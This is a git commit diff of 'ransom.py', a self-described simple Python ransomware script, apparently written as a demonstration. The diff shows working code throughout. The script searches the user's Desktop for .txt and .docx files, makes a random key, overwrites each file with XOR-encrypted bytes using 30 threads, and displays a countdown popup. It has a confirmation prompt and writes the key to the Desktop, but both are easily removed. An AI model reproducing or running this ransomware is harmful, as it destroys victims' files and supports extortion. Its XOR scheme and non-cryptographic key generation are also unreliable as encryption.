a4c98923eac202f00760064cbcf37c6fec4290f9
Vansush95 <57197572+Vansush95@users.noreply.github.com>
2022-04-27 22:48:27 +0530

    Update ransom.py

--- ransom.py
+++ ransom.py
@@ -1,7 +1,6 @@
 # Simple Python ransomware
 import os
 import random
-import base64
 from threading import Thread
 from queue import Queue
 import getpass
@@ -10,7 +9,7 @@ import tkinter as tk
 
 
 
-#setting up a safeguard to avid running the code in the host machine
+#setting up a safeguard to avoid running the code in the host machine
 extend = "\\"
 pc_username = getpass.getuser()
 desktop_path = "C:\\Users\\"+pc_username+"\\Desktop"
@@ -19,57 +18,58 @@ safeguard = input("Are you sure you want to run this program ? y/n \n")
 if safeguard != 'y':
     quit()
 
-#files to be encrypted
-Extension_to_be_encrypted = ('.txt','.docx' , )#you can add as many extension as you want here
+#Enumeraing the types pf files to be encrypted
+#you can add as many extension as you want here
+Extension_to_be_encrypted = ('.txt','.docx' , ) 
 
 #Grab all the files with the required extension
 file_lists_paths = []
-for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Desktop") :
+for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Desktop") : # Change this directory to the test folder path you will create
     for file in files :
-        file_path, file_ext = os.path.splitext(root+extend+file) #separate the name and the extension
+        file_path, file_ext = os.path.splitext(root+extend+file) #this separates the name and the extension
         if file_ext in Extension_to_be_encrypted :
             file_lists_paths.append(root+extend+file)
-#
+            
 # for f in file_lists_paths:
 #      print(f)
 
-#Generate a key to ecnrypt
-lower = string.ascii_lowercase
-upper = string.ascii_uppercase
-digits = string.digits
-special_characters = string.punctuation
+# Creating a pool of all exixting characters
+low = string.ascii_lowercase
+upp = string.ascii_uppercase
+dig = string.digits
+special_char = string.punctuation
 
-combined_characters = lower + upper + digits + special_characters
+combined_characters = low + upp + dig + special_char
 
-
+#Generate a key to ecnrypt from existing pool of characters
 key = ""
-encryption_level = 128 // 8     #this is how many bytes the encryption level is
+encryption_level = 128 // 8     #this is how many bytes the encryption level is, it can be increased according to the lenght of desired encryption key 
 char_pool = []                  #character from which the key can be made of
 for i in (combined_characters) :  #All possible character
     char_pool.append(i)
 for i in range(encryption_level) :
-    key += random.choice(char_pool) #This is the actual key for encryption
+    key += random.choice(char_pool) #The final result is the actual key for encryption
 
-#The decription key will be on the Desktop
+#The decryption key will be on the Desktop only for demonstration purpose
 with open(desktop_path + extend + decrypt_key , "w", encoding="utf-8") as f:
     f.write(key)
 
 print(key)
 
-#encrypt the files
+#encrypting the files with encrypt function
 def encrypt(key):
     while q.not_empty :
         file = q.get()
         index = 0
-        max_index = encryption_level - 1
+        maximum_index = encryption_level - 1
         try :
-            with open(file,"rb") as f :
+            with open(file,"rb") as f : # read each file in binary mode
                 data = f.read()
             with open(file,"wb") as f :
-                for byte in data : #rewriting the bytes
+                for byte in data : # rewriting the bytes using XOR operation 
                     xor_byte = byte ^ ord(key[index]) #ord grabs the ASCII value of the character
                     f.write(xor_byte.to_bytes(1 ,"little"))
-                    if index >= max_index :
+                    if index >= maximum_index :
                         index = 0
                     else :
                         index += 1
@@ -77,7 +77,7 @@ def encrypt(key):
             print(f'Failed to encrypt the {file}')
         q.task_done()
 
-q = Queue() #special list that can help in multi threading
+q = Queue() #special list that can help in multi-threading that helps speeding up the process of encryption
 for file in file_lists_paths:
     q.put(file)
 for i in range(30):
@@ -87,28 +87,27 @@ for i in range(30):
 q.join()
 print("Encryption Successful")
 
-
+#this is responsible for the popup message when ransom.py is run
 def countdown(count):
-    # change text in label
-    hour, minute, second = count.split(':')
-    hour = int(hour)
-    minute = int(minute)
-    second = int(second)
+    h, m, s = count.split(':')
+    h = int(h)  #hours
+    m = int(m)  #minutes
+    s = int(s)  #seconds
 
-    label['text'] = '{}:{}:{}'.format(hour, minute, second)
+    label['text'] = '{}:{}:{}'.format(h, m, s)
 
-    if second > 0 or minute > 0 or hour > 0:
+    if s > 0 or m > 0 or h > 0:
         # call countdown again after 1000ms (1s)
-        if second > 0:
-            second -= 1
-        elif minute > 0:
-            minute -= 1
-            second = 59
-        elif hour > 0:
-            hour -= 1
-            minute = 59
-            second = 59
-        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
+        if s > 0:
+            s -= 1
+        elif m > 0:
+            m -= 1
+            s = 59
+        elif h > 0:
+            h -= 1
+            m = 59
+            s = 59
+        root.after(1000, countdown, '{}:{}:{}'.format(h, m, s))
 
 root = tk.Tk()
 root.title('Python_Ransomware')
